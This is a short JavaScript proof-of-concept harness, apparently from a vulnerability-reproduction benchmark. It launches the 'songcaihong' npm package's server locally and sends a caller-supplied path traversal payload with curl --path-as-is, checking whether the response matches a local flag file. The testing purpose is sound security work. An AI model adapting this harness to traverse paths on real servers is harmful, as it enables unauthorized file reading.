function exploitFunction(payload) {
  const path = require("path");
  const { sleep } = require("sleep");
  const { exec } = require("child_process");
  const fs = require("fs"); // Import the fs module

  const pathToFlag = path.resolve(__dirname, "../flag.html");
  const hostsFile = fs.readFileSync(pathToFlag).toString();

  let server = "node ./node_modules/songcaihong/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
  exec(attack_string, (error, stdout) => {
    if (stdout === hostsFile) {
      console.log("Exploit successful!");
    } else {
      console.error("Exploit failed.");
    }
  });
}

module.exports = { exploitFunction };